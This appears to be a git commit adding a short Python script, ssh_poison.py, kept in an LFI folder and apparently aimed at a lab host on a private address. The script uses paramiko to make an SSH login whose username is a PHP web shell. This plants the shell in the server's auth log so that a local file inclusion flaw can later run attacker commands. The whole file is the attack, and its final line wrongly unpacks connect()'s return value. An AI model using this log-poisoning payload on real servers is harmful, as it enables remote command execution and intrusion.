eb967ccce38aaf88f8c8f52a6f9ce91d7eb4f438
Malachi Woodlee <malachi.woodlee@gmail.com>
2025-05-25 13:31:00 -0400

    Create ssh_poison.py

---
+++ LFI/ssh_poison.py
@@ -0,0 +1,10 @@
+import paramiko
+ 
+host = "192.168.124.80"
+username = "<?php system($_GET[c]); ?>"
+password = ""
+ 
+client = paramiko.client.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+_stdin, _stdout, _stderr = client.connect(host, username=username, password=password)
+print(_stderr.read().decode())
